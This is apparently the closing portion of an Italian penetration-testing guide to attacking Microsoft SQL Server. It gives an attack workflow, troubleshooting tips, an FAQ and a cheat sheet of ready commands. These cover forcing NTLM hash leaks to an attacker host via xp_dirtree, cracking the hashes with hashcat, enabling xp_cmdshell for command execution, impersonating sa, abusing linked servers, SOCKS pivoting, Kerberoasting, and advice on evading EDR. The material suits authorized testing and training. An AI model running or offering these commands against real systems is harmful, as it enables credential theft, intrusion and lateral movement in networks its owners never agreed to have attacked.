**Metasploit — moduli utili:**

```
auxiliary/scanner/mssql/mssql_ping
auxiliary/admin/mssql/mssql_enum
auxiliary/admin/mssql/mssql_escalate_execute_as
auxiliary/admin/mssql/mssql_escalate_dbowner
auxiliary/scanner/mssql/mssql_hashdump
```

***

## 17. Percorso Operativo Consigliato {#17}

```
1. ENUMERA LA PORTA
   └─ nmap -sV -sC -p 1433,1434

2. ACCEDI
   └─ credenziali deboli / brute force → mssqlclient.py

3. ORIENTATI
   └─ SELECT @@VERSION, SYSTEM_USER, DB_NAME()
   └─ SELECT name FROM sys.databases → USE db → tabelle → colonne → dati

4. CAPISCI I TUOI PRIVILEGI
   └─ IS_SRVROLEMEMBER('sysadmin')

5. ENUMERAZIONE APPROFONDITA
   └─ sys.configurations, database trustworthy, job SQL Agent
   └─ stored procedure/view custom, credential, ricerca colonne sensibili

6. HASH CAPTURE (anche senza sysadmin)
   └─ xp_dirtree → Responder → hashcat -m 5600

7. SE NON SEI SYSADMIN
   └─ IMPERSONATE → EXECUTE AS LOGIN='sa'
   └─ db_owner + trustworthy → sp_elevate

8. RCE (con sysadmin)
   └─ xp_cmdshell o alternative stealth (OLE, Python)

9. ESPANDI
   └─ Linked server → EXECUTE AT
   └─ DEFAULT_DOMAIN() → Kerberoasting service account
```

***

## 18. Troubleshooting {#18}

| Problema                                    | Causa                                  | Soluzione                                          |
| ------------------------------------------- | -------------------------------------- | -------------------------------------------------- |
| "Invalid object name 'tabella'"             | Non hai fatto `USE database;` prima    | Esegui `USE NomeDB;` poi ripeti la query           |
| `xp_cmdshell` negato                        | Non sei sysadmin                       | Cerca impersonation o database trustworthy         |
| Hash NTLMv2 con username che finisce in `$` | È un account macchina, password random | Passa a `ntlmrelayx.py` invece di craccare         |
| `sp_configure` non applica la modifica      | Manca `RECONFIGURE` dopo il comando    | Esegui sempre `RECONFIGURE;` subito dopo           |
| Linked server dà errore di permessi         | Mapping credenziali sbagliato          | `EXEC sp_helplinkedsrvlogin 'NOME'` per verificare |

***

## 19. FAQ {#19}

**Come faccio a sapere quanti privilegi ho su un'istanza MSSQL?**
Esegui `SELECT IS_SRVROLEMEMBER('sysadmin');` — se torna `1` sei sysadmin. Per il dettaglio completo usa `SELECT * FROM fn_my_permissions(NULL,'SERVER');`.

**Posso vedere le tabelle senza sapere il nome del database?**
Sì: prima `SELECT name FROM sys.databases;` per la lista, poi `USE nome;` seguito da `SELECT table_name FROM information_schema.tables;`.

**xp\_dirtree funziona anche da utente non-sysadmin?**
Spesso sì — è uno dei motivi per cui è così usato: verifica con `EXEC sp_helprotect 'xp_dirtree';` chi ha i permessi.

**Quando NON conviene usare xp\_cmdshell?**
Quando c'è un EDR attivo che monitora processi figli di `sqlservr.exe`: in quel caso OLE Automation o `sp_execute_external_script` (Python) lasciano meno tracce.

**Il service account MSSQL è sempre Kerberoastable?**
Solo se ha un SPN registrato — quasi sempre ce l'ha (`MSSQLSvc/hostname:1433`).

***

## 20. Cheat Sheet Finale {#20}

```
=== ENUMERAZIONE PORTA ===
nmap -sV -sC -p 1433 TARGET
nmap -sU -p 1434 TARGET          (istanze named)

=== ACCESSO ===
mssqlclient.py sa:pass@TARGET
mssqlclient.py -windows-auth CORP/user:pass@TARGET
nxc mssql TARGET -u sa -p pass.txt

=== ORIENTARSI ===
SELECT @@VERSION;
SELECT SYSTEM_USER;
SELECT DB_NAME();
SELECT name FROM sys.databases;
USE NomeDB;
SELECT table_name FROM information_schema.tables;
SELECT column_name FROM information_schema.columns WHERE table_name='X';
SELECT * FROM X;

=== PRIVILEGI ===
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT * FROM fn_my_permissions(NULL,'SERVER');

=== ENUMERAZIONE APPROFONDITA ===
SELECT * FROM sys.configurations;                          (xp_cmdshell, CLR, ecc.)
SELECT name,SUSER_SNAME(owner_sid),is_trustworthy_on FROM sys.databases;
SELECT * FROM msdb.dbo.sysjobs; msdb.dbo.sysjobsteps;
SELECT * FROM sys.credentials; msdb.dbo.sysproxies;
SELECT name FROM sys.procedures;  → EXEC sp_helptext 'Nome';
SELECT table_name,column_name FROM information_schema.columns WHERE column_name LIKE '%password%';

=== HASH CAPTURE (no sysadmin) ===
EXEC master.dbo.xp_dirtree '\\ATTACKER_IP\share';
responder -I tun0 -v
hashcat -m 5600 hash.txt rockyou.txt

=== RCE (sysadmin) ===
EXEC sp_configure 'show advanced options',1;RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
EXEC master..xp_cmdshell 'whoami';

=== PRIVESC ===
EXECUTE AS LOGIN='sa';  → impersonation
sys.databases WHERE is_trustworthy_on=1 + db_owner → sp_elevate

=== LINKED SERVER ===
SELECT name FROM sys.servers WHERE is_linked=1;
EXEC ('whoami') AT [LINKED];

=== PIVOTING (solo 1433 raggiungibile) ===
mssqlproxy.py -q sa:pass@TARGET  → tunnel SOCKS5 + proxychains

=== AD ===
SELECT DEFAULT_DOMAIN();
GetUserSPNs.py corp.local/user:pass -request | grep MSSQL
```

***

## Riferimenti

* [HackTricks – Pentesting MSSQL](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
* [PayloadsAllTheThings – MSSQL Injection](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/)
* [NetSPI – Decrypting MSSQL Linked Server Passwords](https://www.netspi.com/blog/technical-blog/adversary-simulation/decrypting-mssql-database-link-server-passwords/)

**Guide correlate su hackita.it:**

* [SQL Injection su MSSQL: guida web](https://hackita.it/articoli/sql-injection-mssql/)
* [Impacket: Guida Completa](https://hackita.it/articoli/impacket)
* [Responder: Hash Capture e NTLM Relay](https://hackita.it/articoli/responder)
* [Kerberoasting e Service Account Attack](https://hackita.it/articoli/kerberos)
* [Active Directory Enumeration con BloodHound](https://hackita.it/articoli/active-directory)

> Uso esclusivo in ambienti autorizzati.
